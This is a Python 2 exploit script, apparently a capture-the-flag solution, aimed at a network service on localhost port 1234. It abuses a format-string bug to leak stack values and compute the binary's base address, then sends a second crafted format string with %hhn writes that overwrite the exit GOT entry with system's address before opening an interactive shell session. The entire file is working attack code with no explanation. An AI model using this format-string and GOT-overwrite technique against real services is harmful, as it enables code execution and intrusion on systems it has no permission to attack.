#!/usr/bin/python
import sys
import socket
import telnetlib 
import time
from struct import pack

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        print "-=(warning)=- recvuntil() failed at recv"
        print "Last received data:"
        print d
        return False
    except socket.error as msg:
      print "-=(warning)=- recvuntil() failed:", msg
      print "Last received data:"
      print d      
      return False
    d += dnow
  return d

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        print "-=(warning)=- recvuntil() failed at recv"
        print "Last received data:"
        print d        
        return False
    except socket.error as msg:
      print "-=(warning)=- recvuntil() failed:", msg
      print "Last received data:"
      print d      
      return False
    d += dnow
  return d

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    return recvall(self._sock, n)

  def recvuntil(self, txt):
    return recvuntil(self._sock, txt)  

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def go():  
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  
  # Put your code here!

  fmt = "%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x"
  fmt = fmt.ljust(60, ':')

  s.sendall("tan%s\n" % fmt)
  time.sleep(0.1)
  s.sendall(
      "9\n" +
      (("%i\n" % -0x80000000) * 9)
      )

  MAGIC = "Learn as if you were to live forever. -- Mahatma Ghandi, operands: [-2147483648, -2147483648, -2147483648, -2147483648, -2147483648, -2147483648, -2147483648, -2147483648, -2147483648]\ntan"

  s.recvuntil(MAGIC)
  values = s.recvall(15 * 8)
  s.recvuntil("Choice: ")

  i = 0
  v = []
  while i < len(values):
    print i/8, values[i:i+8]
    v.append(int(values[i:i+8], 16))
    i += 8

  BIN_ADDR = ((v[0] & (~0xfff)) - 0x3000) & 0xffffffff
  print "BIN_ADDR: %x" % BIN_ADDR

  BIN_SYSTEM = BIN_ADDR + 0xD20

  BIN_GOTPLT_EXIT = BIN_ADDR + 0x3AC8
  print "BIN_GOTPLT_EXIT: %x" % BIN_GOTPLT_EXIT  
  
  # 120

  fmt = "A%s%s%s%sAAA" % (
      dd(BIN_GOTPLT_EXIT + 0),
      dd(BIN_GOTPLT_EXIT + 1),
      dd(BIN_GOTPLT_EXIT + 2),
      dd(BIN_GOTPLT_EXIT + 3)
      )

  k = [ord(x) for x in dd(BIN_SYSTEM)]

  cnt = 0x4b
  y = k[0] + 0x100 - cnt
  if y >= 0x100: 
    y -= 0x100

  print y, hex(k[0])

  if y != 0: 
    fmt += "%%%u.x" % y  
    cnt = (cnt + y) & 0xff
  fmt += "%120$hhn"

  y = k[1] + 0x100 - cnt
  if y >= 0x100: 
    y -= 0x100

  print y, hex(k[1])

  if y != 0: 
    fmt += "%%%u.x" % y  
    cnt = (cnt + y) & 0xff
  fmt += "%121$hhn"

  """
  y = k[2] + 0x100 - cnt
  if y >= 0x100: 
    y -= 0x100

  print y

  if y != 0: 
    fmt += "%%%u.x" % y  
    cnt = (cnt + y) & 0xff
  fmt += "%122$hhn"

  y = k[3] + 0x100 - cnt
  if y >= 0x100: 
    y -= 0x100

  print y

  if y != 0: 
    fmt += "%%%u.x" % y  
  fmt += "%123$hhn"    
  """


  fmt = fmt.ljust(60, ':')


  print "-" * 50, len(fmt)
  print fmt


  s.sendall("tan%s\n" % fmt)
  time.sleep(0.1)
  s.sendall(
      "9\n" +
      (("%i\n" % -0x80000000) * 9)
      )
     
  s.recvuntil(MAGIC)
  values = s.recvuntil(":")
  print values
  s.recvuntil("Choice: ")

  s.sendall("quit\n")

  


  # Interactive sockets.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

  # Python console.
  # Note: you might need to modify ReceiverClass if you want
  #       to parse incoming packets.
  #ReceiverClass(s).start()
  #dct = locals()
  #for k in globals().keys():
  #  if k not in dct:
  #    dct[k] = globals()[k]
  #code.InteractiveConsole(dct).interact()

  s.close()

HOST = '127.0.0.1'
PORT = 1234
go()


